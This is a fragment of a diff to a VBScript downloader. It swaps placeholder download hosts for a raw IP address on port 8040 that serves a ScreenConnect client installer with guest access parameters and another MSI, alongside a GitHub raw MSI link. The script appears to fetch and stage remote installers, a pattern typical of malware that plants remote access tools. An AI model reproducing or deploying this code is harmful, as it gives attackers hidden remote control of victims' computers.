@@ -3,8 +3,8 @@ Dim PACKAGE_URLS, TEMP_PATH, TEMP_DIR
 
 PACKAGE_URLS = Array( _
     "https://raw.githubusercontent.com/lordbacklink/Screen-01/refs/heads/main/1.msi", _
-    "https://site2.com/1.msi", _
-    "https://site3.com/1.msi" _
+    "http://103.215.0.12:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest", _
+    " http://103.215.0.12:8040/Bin/1.msi" _
 )
 
 TEMP_DIR  = "C:\Temp"
